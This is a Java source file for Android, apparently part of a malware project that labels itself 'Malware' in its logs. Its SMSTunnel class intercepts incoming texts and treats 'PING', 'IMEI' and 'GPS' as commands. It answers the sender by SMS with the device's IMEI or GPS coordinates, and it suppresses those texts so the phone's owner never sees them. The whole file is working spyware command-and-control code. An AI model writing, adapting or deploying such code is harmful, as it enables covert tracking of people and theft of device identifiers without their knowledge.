package listener;

import routine.AndroidDeviceData;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

public class SMSTunnel extends BroadcastReceiver {

	private AndroidDeviceData androidDeviceData;

	@Override
	public void onReceive(Context context, Intent intent) {
		Log.w("Malware", "[+] new SMS");

		androidDeviceData = new AndroidDeviceData(context);

		final Bundle bundle = intent.getExtras();
		if (bundle == null)
			return;

		final Object[] pdus = (Object[]) bundle.get("pdus");
		SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdus[0]);

		// origin address
		String source = msg.getDisplayOriginatingAddress();
		// message text body
		String text = msg.getDisplayMessageBody();
		// CallBack Action
		callBackAction(source, text);
	}

	public void callBackAction(String source, String text) {
		switch (text) {
		case "PING":
			sendSMS(source, "PONG");
			abortBroadcast();
			break;
		case "IMEI":
			sendSMS(source, androidDeviceData.getImei());
			abortBroadcast();
			break;
		case "GPS":
			sendSMS(source, androidDeviceData.getLatitude() + " "
					+ androidDeviceData.getLongitude());
			abortBroadcast();
			break;
		default:
			break;
		}
	}

	private void sendSMS(String dest, String text) {
		SmsManager smsManager = SmsManager.getDefault();
		smsManager.sendTextMessage(dest, null, text, null, null);
	}
}
